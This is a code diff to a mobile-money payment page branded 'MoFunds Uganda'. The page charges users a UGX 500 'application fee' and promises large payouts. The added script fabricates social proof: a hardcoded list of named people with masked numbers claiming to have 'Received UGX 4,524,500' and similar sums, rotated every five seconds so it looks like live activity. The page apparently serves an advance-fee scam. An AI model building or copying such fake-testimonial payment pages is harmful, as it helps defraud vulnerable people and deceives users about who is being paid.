@@ -60,8 +60,6 @@ input:focus{
 border-color:#000;
 box-shadow:0 0 0 3px rgba(255,209,0,.25);
 }
-
-/* NEW */
 .provider-buttons{
 display:flex;
 gap:10px;
@@ -83,7 +81,6 @@ border-color:#FFD100;
 background:#000;
 color:#FFD100;
 }
-
 button{
 width:100%;
 padding:14px;
@@ -110,6 +107,7 @@ font-weight:600;
 .success{color:#0A7A2A;}
 .error{color:#D32F2F;}
 .small{margin-top:10px;font-size:12px;color:#666;}
+
 .live-comments{
 position:relative;
 margin-top:25px;
@@ -119,7 +117,13 @@ background:rgba(255,255,255,.9);
 border:1px solid rgba(0,0,0,.08);
 overflow:hidden;
 }
-.live-comments h3{text-align:center;font-size:17px;margin-bottom:15px;position:relative;z-index:2;}
+.live-comments h3{
+text-align:center;
+font-size:17px;
+margin-bottom:15px;
+position:relative;
+z-index:2;
+}
 .live-comment{
 display:flex;
 align-items:center;
@@ -132,7 +136,6 @@ border:1px solid rgba(0,0,0,.12);
 position:relative;
 z-index:2;
 }
-.live-comment:last-child{margin-bottom:0;}
 .live-avatar{
 width:42px;
 height:42px;
@@ -148,25 +151,39 @@ flex-shrink:0;
 .live-content strong{display:block;font-size:14px;}
 .live-content p{text-align:left;font-size:13px;margin:2px 0;color:#444;}
 .live-content small{font-size:11px;color:#666;}
+
 .flower-rain{
 position:absolute;
 top:42px;
 left:0;
 width:100%;
-height:170px;
+height:190px;
 pointer-events:none;
 z-index:1;
+overflow:hidden;
 }
 .rain-flower{
 position:absolute;
-top:-30px;
-font-size:20px;
+top:-35px;
 animation:flowerFall linear forwards;
 }
-.footer{text-align:center;padding:14px;font-size:12px;color:#666;}
+
 @keyframes flowerFall{
-0%{transform:translateY(-20px) rotate(0deg);opacity:1;}
-100%{transform:translateY(190px) rotate(360deg);opacity:0;}
+0%{
+transform:translateY(-40px) rotate(0deg);
+opacity:1;
+}
+100%{
+transform:translateY(230px) rotate(360deg);
+opacity:0;
+}
+}
+
+.footer{
+text-align:center;
+padding:14px;
+font-size:12px;
+color:#666;
 }
 </style>
 </head>
@@ -186,7 +203,7 @@ animation:flowerFall linear forwards;
 </div>
 
 <div class="amount" id="feeAmount">
-🧾 Application Fee: <span class="money">UGX 450</span>
+🧾 Application Fee: <span class="money">UGX 500</span>
 </div>
 
 <label>👤 Full Name</label>
@@ -195,7 +212,6 @@ animation:flowerFall linear forwards;
 <label>📱 Phone Number</label>
 <input type="tel" id="phone" placeholder="2567XXXXXXXX" maxlength="12">
 
-<!-- NEW -->
 <label>📲 Mobile Money Provider</label>
 <div class="provider-buttons">
 <button type="button" class="provider active" data-provider="mtn">MTN MoMo</button>
@@ -210,7 +226,6 @@ animation:flowerFall linear forwards;
 📲 Follow the payment instructions on the phone number entered above.
 </p>
 
-<!-- Everything below remains unchanged -->
 <div class="live-comments">
 <h3>🎉 PEOPLE RECEIVING MOMO FUNDS UGANDA SUPPORT RIGHT NOW</h3>
 
@@ -233,6 +248,7 @@ animation:flowerFall linear forwards;
 <small id="liveTime2">12s ago</small>
 </div>
 </div>
+
 </div>
 
 <div class="footer">© 2026 MoFunds Uganda</div>
@@ -257,7 +273,7 @@ localStorage.getItem("phone")||
 "";
 
 const processingFee=
-Number(localStorage.getItem("processingFee")||450);
+Number(localStorage.getItem("processingFee")||500);
 
 const selectedAmount=
 Number(localStorage.getItem("selectedAmount")||0);
@@ -276,8 +292,8 @@ const phoneEl=document.getElementById("phone");
 const payBtn=document.getElementById("payBtn");
 const msg=document.getElementById("stkMessage");
 
-/* NEW */
 let selectedProvider="mtn";
+
 document.querySelectorAll(".provider").forEach(btn=>{
 btn.addEventListener("click",()=>{
 document.querySelectorAll(".provider").forEach(b=>b.classList.remove("active"));
@@ -346,11 +362,8 @@ throw new Error(data.message||"Payment request failed.");
 
 const transactionId=
 data.transactionId||
-data.data?.transaction_id||
-data.data?.transactionId||
-data.transaction_id||
-data.reference||
-data.data?.reference;
+data.data?.reference||
+data.reference;
 
 if(!transactionId){
 throw new Error("OptimaPay did not return a transaction ID.");
@@ -376,7 +389,6 @@ while(Date.now()-start<120000){
 try{
 
 const response=await fetch(`${BACKEND_URL}/api/status/${transactionId}`);
-
 const result=await readJson(response);
 
 const payment=result.data||result;
@@ -417,7 +429,58 @@ setLoading(false,"💳 Continue Payment");
 
 payBtn.addEventListener("click",payNow);
 
-/* Keep all your existing flower animation and live comments code exactly as it is */
+/* FLOWERS MOVING DOWN CONTINUOUSLY */
+
+const rainContainer=document.getElementById("flowerRain");
+const flowerIcons=["🌸","🌺","🌹","🌼","💐","🌷"];
+
+function createRainFlower(){
+const flower=document.createElement("span");
+flower.className="rain-flower";
+flower.textContent=flowerIcons[Math.floor(Math.random()*flowerIcons.length)];
+flower.style.left=Math.random()*100+"%";
+flower.style.fontSize=(16+Math.random()*12)+"px";
+flower.style.animationDuration=(2+Math.random()*2)+"s";
+rainContainer.appendChild(flower);
+setTimeout(()=>flower.remove(),4500);
+}
+
+setInterval(createRainFlower,180);
+
+/* LIVE COMMENTS EVERY 5 SECONDS */
+
+const livePeople=[
+["Amina","07*****37","Application submitted","5s ago"],
+["Brian","07*****47","Received UGX 1,700,500","19s ago"],
+["Grace","07*****65","Application submitted","16s ago"],
+["Sarah","07*****39","Received UGX 4,524,500","8s ago"],
+["John","07*****95","Application submitted","5s ago"],
+["David","07*****28","Received UGX 2,100,500","12s ago"],
+["Faith","07*****74","Received UGX 3,100,500","10s ago"],
+["Mary","07*****71","Application submitted","9s ago"],
+["Peter","07*****84","Received UGX 1,228,500","15s ago"],
+["James","07*****53","Received UGX 5,624,500","20s ago"]
+];
+
+let current=0;
+
+function updateLiveComments(){
+const p1=livePeople[current];
+const p2=livePeople[(current+1)%livePeople.length];
+
+liveName1.textContent=p1[0];
+livePhone1.textContent=p1[1];
+liveTime1.textContent=p1[3];
+
+liveName2.textContent=p2[0];
+livePhone2.textContent=p2[1];
+liveTime2.textContent=p2[3];
+
+current=(current+2)%livePeople.length;
+}
+
+updateLiveComments();
+setInterval(updateLiveComments,5000);
 </script>
 
 </body>
